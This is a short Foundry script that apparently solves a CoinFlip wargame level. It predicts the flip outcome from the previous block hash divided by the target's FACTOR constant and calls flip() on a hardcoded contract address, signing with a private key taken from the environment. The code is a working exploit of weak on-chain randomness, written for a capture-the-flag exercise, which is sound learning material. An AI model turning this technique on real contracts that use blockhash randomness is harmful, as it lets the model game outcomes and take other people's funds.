// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";

import "forge-std/console.sol";

import {Level3CoinFlip} from "../src/Level3CoinFlip.sol";

contract Level3CoinFlipSolution is Script {
    Level3CoinFlip public level3CoinFlip = Level3CoinFlip(0xAf95Ceb03149e78dfE718A0F7b5aEB45bef6D386);

    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function setUp() public {}

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        uint256 blockValue = uint256(blockhash(block.number - 1));

        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        level3CoinFlip.flip(side);

        vm.stopBroadcast();
    }
}
